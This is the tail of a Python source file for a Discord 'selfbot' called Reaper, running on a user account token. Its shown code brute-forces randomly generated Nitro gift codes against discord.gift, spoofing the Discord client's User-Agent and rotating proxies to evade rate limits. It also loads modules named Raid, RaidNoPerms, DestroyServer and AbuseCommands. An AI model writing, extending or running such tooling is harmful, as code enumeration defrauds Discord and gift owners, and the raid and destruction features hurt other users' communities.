            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36'
            }

    def groß(self):
        # Escape Required: . + * ? [] $ ^ () {} | \
        _codes = []
        with open(self.cfg["FileToCheck"], "r") as f:
            _l = f.readlines()
            for l in _l:
                try:
                    n = self.cfg["CheckingFormat"]\
                        .format(code="(\w+)")\
                        .replace(".", "[.]")
                    _codes.append(re.findall(n, l)[0])
                except:
                    continue
                continue
            end()
        return _codes

    def getproxy(self, txt: str, amount: int, proxy_type: str):
        if proxy_type:
            if proxy_type.lower() not in ["socks4", "socks5", "http"]: return -2
            else: pass
        try: proxies = open(txt, "r").readlines()
        except: return -1
        proxyDict = {}
        for i in range(amount):
            _p1 = ":".join(random.choice(proxies).split(":"))
            _p2 = f"{proxy_type}://{_p1}"
            proxyDict.update( dict(http=_p2) )
        return proxyDict

    def _nitrodata(self, code, n):
        _start = pytime.time()
        _separator = f"{Style.RESET_ALL} | {Style.BRIGHT}"
        _bright = f"{Style.BRIGHT}"
        _white = f"{Fore.WHITE}"
        _space = s.space
        _proxyConf = config["NitroChecker"]["Proxies"]
        if _proxyConf["Enabled"] == True:
            _res = requests.get(n, 
            headers=self.headers, 
            proxies=self.getproxy(
            _proxyConf["ProxyTxtFile"], 
            1, _proxyConf["ProxyType"])).status_code
        else:
            _res = requests.get(n, 
            headers=self.headers).status_code
        _ers = {
            1: (_res == 200),
            2: (_res == 404),
            3: (_res == 429)
        }
        if _ers[1]:
            _elapsed = str(pytime.time() - _start).split(".")[0] + "." + str(pytime.time() - _start).split(".")[1][:4] + "s"
            print(_space+_bright+f'Valid Code{_separator}https://discord.gift/{Fore.GREEN}{str(code)}{_white}{_separator}{_elapsed}'+Fore.RESET)
            _re = 1
        elif _ers[2]:
            _elapsed = str(pytime.time() - _start).split(".")[0] + "." + str(pytime.time() - _start).split(".")[1][:4] + "s"
            print(_space+_bright+f'Invalid Code{_separator}https://discord.gift/{Fore.RED}{str(code)}{_white}{_separator}{_elapsed}'+Fore.RESET)
            _re = -1
        elif _ers[3]:
            _elapsed = str(pytime.time() - _start).split(".")[0] + "." + str(pytime.time() - _start).split(".")[1][:4] + "s"
            print(_space+_bright+f'Request Error{_separator}https://discord.gift/{Fore.RED}{str(code)}{_white}{_separator}{_elapsed}'+Fore.RESET)
            _re = -2
        else:
            _elapsed = str(pytime.time() - _start).split(".")[0] + "." + str(pytime.time() - _start).split(".")[1][:4] + "s"
            print(_space+_bright+f'Request Error{_separator}https://discord.gift/{Fore.RED}{str(code)}{_white}{_separator}{_elapsed}'+Fore.RESET)
            _re = -2
        if _re == -2:
            self._nitrodata(code, n)
        else:
            return _re

    def _updatetitle(self): return ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro Checker | Valid: {self.valid}, Used: {self.used}, Invalid: {self.invalid}")

    @commands.command()
    async def nitrochecker(self, ctx, mode: str, *, args = None):
        if await disableCmd(ctx) == 0: return
        
        # YAML:
        # 
        # Proxies: # Proxy settings
        # UseProxies: false # Options: false, true
        # ProxyFile: "proxies.txt" # Proxy file

        try:
            await ctx.message.delete()

            if mode == "threads" or mode == "generator" or mode == "thread":
                if args == None or args == []:
                    print(errorcol+"Missing required arguments!")
                args = args.split()
                amount = int(args[0])
                sleepDur = int(args[1]) if args[1] else int (self.cfg["DefaultDelay"])
                for i in range(amount):
                    code = []
                    for _i in range(16): code.append(random.choice(letters))
                    code = "".join(code)
                    try:
                        _url = self.url(code)
                        _res = self._nitrodata(code, _url)
                        if _res == -2: continue
                        if _res == -1: self.invalid += 1; self._updatetitle()
                        if _res ==  0: self.used += 1;    self._updatetitle()
                        if _res ==  1: self.valid += 1;   self._updatetitle()
                        end()
                    except:
                        continue
                    sleep(sleepDur)
                end()
            elif mode == "txtreader" or mode == "txt" or mode == "filereader" or mode == "file" or mode == "reader":
                code = list(self.groß())
                for n in list(code):
                    sleepDur = int(args) if args else int (self.cfg["DefaultDelay"])
                    try:
                        _url = self.url(n)
                        _res = self._nitrodata(n, _url)
                        if _res == -2: continue
                        if _res == -1: self.invalid += 1; self._updatetitle()
                        if _res ==  0: self.used += 1;    self._updatetitle()
                        if _res ==  1: self.valid += 1;   self._updatetitle()
                        end()
                    except:
                        continue
                    sleep(sleepDur)
                end()
            ctypes.windll.kernel32.SetConsoleTitleW(f'Reaper Selfbot [{CURRENT_VERSION}] Account: {reaper.user} ({username})')
        except Exception as e:
            print(e)
        cmdused("nitrochecker")
    end()

def setup(bot):
    cogs = [
        Tools, Ungrouped, ErrorEvents, FunCommands, HelpCommands, TextCommands, NSFWCommands,
        MathCommands, UserCommands, Configuration, AbuseCommands, AdminCommands, NitroCommands,
        MiscellaneousCommands, PremiumCommands, ImageCmds, CopyServer, CustomCommands, Encoding,
        ColorText, React, InvoiceCommands, nitroChecker, AnimCommands, DestroyServer, FancyFont,
        Raid, RaidNoPerms
    ]
    for cog in cogs:
        try:
            bot.add_cog(cog(bot)) #; print("import {}".format(cog))
            print(Fore.LIGHTBLACK_EX+f"imported {cog}")
        except Exception as e:
            print(e)
            sleep(3)
            continue

setup(reaper)

# END PART: Logging in to the user

os.system('cls')
#loading1("Loading reaper selfbot... please wait...")
if True:
    os.system('cls')
    print()
    ctypes.windll.kernel32.SetConsoleTitleW(f'Logging in to discord...')
    title(0, False)
    print("MOTD: There's MOTD now *(insert api) .".center(int(str(os.get_terminal_size()).split("os.terminal_size(columns=")[1].split(", lines=")[0])))
    print(Fore.RESET)
    _white = Fore.LIGHTBLACK_EX
    colors = {}
    if compat == False:
        colors.update({1: "\033[4m\033[38;5;0m"})
    else:
        colors.update({1: Fore.WHITE})
    for idx, chx in enumerate(range(23)):
        if compat == False:
            m = idx+2
            n = f"\033[38;5;{232+chx}m"
            colors.update({m: n})
        else:
            m = idx+2
            colors.update({m: Fore.WHITE})
    def color_(m: int, n: int = 24):
        m: int
        n: int
        if m == 0:
            clr = ""
            for idx in range(n):
                clr += f'{colors[idx + 1]} '*2
            return clr
        elif m == -1:
            clr = ""
            for idx in range(24):
                clr += f'{colors[24 - (idx)]} '*2
            return clr
    a = [
        ' '*57 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*1  + Fore.WHITE + _white + '\033[4m '*1 + Fore.BLUE + _white + ' ',
        ' '*55 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*3  + Fore.WHITE + _white + '\033[4m '*3 + Fore.BLUE + _white + ' ',
        ' '*53 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*5  + Fore.WHITE + _white + '\033[4m '*5 + Fore.BLUE + _white + ' ',
        ' '*51 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*7  + Fore.WHITE + _white + '\033[4m '*7 + Fore.BLUE + _white + ' ',
        ' '*49 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*9  + Fore.WHITE + _white + '\033[4m '*9 + Fore.BLUE + _white + ' ',
        ' '*47 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*11 + Fore.WHITE + _white + '\033[4m '*11 + Fore.BLUE + _white + ' ',
        ' '*45 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*13 + Fore.WHITE + _white + '\033[4m '*13 + Fore.BLUE + _white + ' ',
        ' '*43 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*15 + Fore.WHITE + _white + '\033[4m '*15 + Fore.BLUE + _white + ' ',
        ' '*41 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*17 + Fore.WHITE + _white + '\033[4m '*17 + Fore.BLUE + _white + ' ',
        ' '*39 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*19 + Fore.WHITE + _white + '\033[4m '*19 + Fore.BLUE + _white + ' ',
        ' '*37 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*21 + Fore.WHITE + _white + '\033[4m '*21 + Fore.BLUE + _white + ' ',
        ' '*35 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*23 + Fore.WHITE + _white + '\033[4m '*23 + Fore.BLUE + _white + ' ',
        ' '*33 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*25 + Fore.WHITE + _white + '\033[4m '*25 + Fore.BLUE + _white + ' ',
        ' '*31 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*27 + Fore.WHITE + _white + '\033[4m '*27 + Fore.BLUE + _white + ' ',
        ' '*29 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*29 + Fore.WHITE + _white + '\033[4m '*29 + Fore.BLUE + _white + ' ',
        ' '*27 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*31 + Fore.WHITE + _white + '\033[4m '*31 + Fore.BLUE + _white + ' ',
        ' '*25 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*33 + Fore.WHITE + _white + '\033[4m '*33 + Fore.BLUE + _white + ' ',
        ' '*23 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*35 + Fore.WHITE + _white + '\033[4m '*35 + Fore.BLUE + _white + ' ',
        ' '*21 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*37 + Fore.WHITE + _white + '\033[4m '*37 + Fore.BLUE + _white + ' ',
        ' '*19 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*39 + Fore.WHITE + _white + '\033[4m '*39 + Fore.BLUE + _white + ' ',
        ' '*17 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*41 + Fore.WHITE + _white + '\033[4m '*41 + Fore.BLUE + _white + ' ',
        ' '*15 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*43 + Fore.WHITE + _white + '\033[4m '*41 + Fore.BLUE + _white + ' ',
        ' '*13 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*45 + Fore.WHITE + _white + '\033[4m '*45 + Fore.BLUE + _white + ' ',
        ' '*11 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*47 + Fore.WHITE + _white + '\033[4m '*47 + Fore.BLUE + _white + ' ',
        ' '*9 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*49 + Fore.WHITE + _white + '\033[4m '*49 + Fore.BLUE + _white + ' ',
        ' '*7 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*51 + Fore.WHITE + _white + '\033[4m '*51 + Fore.BLUE + _white + ' ',
        ' '*5 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*53 + Fore.WHITE + _white + '\033[4m '*53 + Fore.BLUE + _white + ' ',
        ' '*3 + Fore.BLUE + _white + ' ' + Fore.WHITE + _white + '\033[4m '*55 + Fore.WHITE + _white + '\033[4m '*55 + Fore.BLUE + _white + ' ',
        color_(0) + '\033[4m '*4 + "      " + Fore.WHITE + "\033[4m      " + '\033[4m '*4 + color_(-1)
    ]
    for i in range(len(a)):
        sleep(0.05)
        sys.stdout.write("\r" + Style.RESET_ALL + a[i % len(a)])
        sys.stdout.flush()
    if token == 'Automatic':
        try:
            reaper.run(str(hoe_token), bot=False)
            #reaper.run(str(hoe_token), bot=False)
        except:
            #print(hoe_token)
            u = 15
            print(Style.RESET_ALL+"\n"+s.space+s.red+"There was an error logging into that token, "
                "try toggling on/off for the (Login/Bot) in the config.yml\n  "
                "when being asked which account. If it still does not work, please "
                "create a ticket for support on our community\n  discord server.")
            while u != 0:
                sys.stdout.write(f"\r{Style.BRIGHT}  "+s.dyellow+f"Returning to login page in {str(u)} seconds.")
                sleep(1)
                u = u - 1
            mainProgram()
    else:
        try:
            reaper.run(hoe_token, bot=bool(config["Login"]["Bot"]))
        except Exception as _e:
            print(logs+str(_e))
            sleep(4)
            exit()
